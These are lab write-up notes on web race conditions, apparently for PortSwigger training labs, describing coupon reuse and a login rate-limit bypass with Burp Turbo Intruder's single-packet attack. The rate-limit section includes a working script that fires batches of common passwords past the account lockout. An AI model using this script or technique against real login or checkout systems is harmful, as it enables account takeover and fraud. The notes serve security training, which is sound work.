# Race conditions

- https://portswigger.net/web-security/race-conditions
- https://portswigger.net/research/smashing-the-state-machine
- https://www.youtube.com/watch?v=tKJzsaB1ZvI
- https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
- https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py

## Limit overrun race conditions

While making a purchase we are able to submit a coupon for 20% discount. 

`POST /cart/coupon` request applying the coupon can be intercepted and once we do that we can perform `single-packet-attack` using Burp Turbo Intruder, which makes use of HTTP2 streaming, stacking multiple requests in one connection, `Nagle's algorithm` and `last byte synchronization`. This send 20-30 request without their last byte, each in different stream. Then in the single frame send the ending of each frame in different streams, causing the server to accept and start calculating them all in nearly the same time.

Performing this attack for that requests reveals that there is not well handled time difference between accepting the coupon and devalidating it, which causes to apply the same coupon multiple times, solving the lab.

## Bypassing rate limits via race conditions

After too many failed request attempts the applications blocks us from performing further login tries for some increasing period of time.

We can observe, that sending a few requests one by one, starts responding with block error, but when sending 20 request at the same tim with `single-packet-attack`, the application always responds with `Incorrrect username or password`, and not with block error, because of that we can suspect race condition bug in this rate limiting functionality. 

Using Turbo Intruder code shown below, we are able to conduct `single-packet-attack`, performing 20 password guesses every block (every 60, 120, 180... seconds), because the application incorrecly handle time between checking the condition for block and blocking the account.

```
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
import time

REQUESTS_PER_GATE = 20
PASSWORDS = [
    "123123",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "1234567890",
    "michael",
    "x654321",
    "superman",
    "1qaz2wsx",
    "baseball",
    "7777777",
    "121212",
    "000000",
]

def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    index = 0
    wait_seconds = 0
    for pwd in PASSWORDS:
        index += 1
        engine.queue(target.req, [pwd], gate='race')
        if index >= REQUESTS_PER_GATE:
            # once every 'race' tagged request has been queued
            # invoke engine.openGate() to send them in sync
            time.sleep(wait_seconds + 5)
            engine.openGate('race')
            wait_seconds += 60
            index = 0
            

def handleResponse(req, interesting):
    table.add(req)
```
